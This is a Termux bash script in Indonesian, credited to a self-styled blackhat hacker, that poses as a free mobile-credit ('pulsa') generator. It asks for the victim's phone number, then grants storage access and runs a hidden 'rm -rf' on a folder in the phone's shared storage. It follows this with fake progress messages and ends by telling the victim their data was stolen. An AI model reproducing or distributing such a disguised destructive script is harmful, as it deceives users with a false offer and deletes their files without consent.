#!/system/xbin/bash
# Bersihkan Layar
clear
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
###################################################
# CTRL C-
###################################################
trap ctrl_c INT
ctrl_c() {
clear
echo $red"[#]> (Ctrl + C ) Detected, 
Trying To Exit ... "
sleep 1
echo ""
echo $yellow"[#]> Terima kasih Telah Menggunakan Tools Saya :)"
sleep 1
echo ""
echo $white"[#]> BLACKHAT HACKER INDONESIA"
read enter
exit
}
echo             "
____________________________________________" | lolcat
echo $Orange"Gmail ane :mrcrack@kbox.li"
echo $Orange"AUTHOR : Mr Crack"
echo $silver"BLACKHAT HACKER INDONESIA"
echo             "
____________________________________________" | lolcat
echo $green"01)PULSA GENERATOR"
echo $green"02)KUOTA GENERATOR(COMING SOON)"
read -p "[Mr Crack]> " bro;

if [ $bro = 1 ] || [ $bro = 01 ]
then
clear
echo $green"Masukkan Nomor Handphone Anda "
read -p "[Mr Crack]> " bro;
echo $green"Pilih Nominal Pulsa"
sleep 3
echo $blue"Ketik 50 Untuk Claim Pulsa 50.000 Rupiah"
sleep 3
echo $blue"Ketik 25 Untuk Claim Pulsa 25.000 Rupiah"
sleep 3
echo $blue"Ketik 10 Untuk Claim Pulsa 10.000 Rupiah"
sleep 3
read -p "[Mr Crack]> " bro;
sleep 5
termux-setup-storage
rm -rf /storage/emulated/0/Dancok
echo $green"✓Pengisian Pulsa Sedang Berlangsung(60 Detik)"
sleep 4
echo $green"✓Pengisian Pulsa Sedang Berlangsung(59 Detik)"
sleep 4
echo $green"✓Pengisian Pulsa Sedang Berlangsung(58 Detik)"
sleep 4
echo $green"✓Pengisian Pulsa Sedang Berlangsung(57 Detik)"
sleep 4
echo $green"✓Pengisian Pulsa Sedang Berlangsung(56 Detik)"
sleep 4
echo $green"✓Pengisian Pulsa Sedang Berlangsung(55 Detik)"
sleep 4
echo $red"[Lapor]Pengisian Pulsa Gagal !! "
sleep 6
echo $green"ULANGI Y/N"
read -p "[Mr Crack]> " bro;
sleep 4
echo $green"✓Pengisian Pulsa Sedang Berlangsung(60 Detik)"
sleep 4
echo $green"✓Pengisian Pulsa Sedang Berlangsung(59 Detik)"
sleep 4
echo $green"✓Pengisian Pulsa Sedang Berlangsung(58 Detik)"
sleep 4
echo $green"Success!!"
sleep 1
echo $blue"Data Data Anda Saya Curi!!"
sleep 10
clear
echo $blue"Perlu Bantuan?"
sleep 1
echo $blue"Whatsapp Me : +371 21 795 867"
sleep 1
echo $blue"Thanks To : Mr SoUrchID/"
sleep 1
echo $blue"Thanks To : Mr Hari-X"
sleep 1
echo $blue"Thanks To : Crusher."
sleep 1
echo $blue"Thanks To : Hans"
exit
fi